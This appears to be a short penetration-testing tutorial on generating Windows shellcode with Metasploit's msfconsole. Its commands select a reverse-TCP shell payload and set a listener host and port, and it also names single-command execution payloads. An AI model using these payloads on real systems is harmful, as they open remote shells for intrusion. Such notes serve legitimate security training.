# Generate shellcode

An easy way to generate shellcode is by using `msfvenom` or `msconsole`. I mostly see people recommending msfvenom online, but I think msfconsole can be a bit easier to work with. But of course it is the same thing, just different interfaces.

## Msfconsole

In msfconsole you have the keyword `generate` that help us generate shellcode. So first we have to select a payload.

```
use payload/windows/shell_reverse_tcp
```

Now we set the variables as usual

```
set LPORT 5555
set LHOST 192.168.0.101
```

Now we genereate the shellcode using the command `generate`.

To see the options use `generate -h`

## Single commands in windows

If you don't have space and only want to execute a single command you can use

```
use payload/windows/exec

use payload/cmd/windows/generic
```

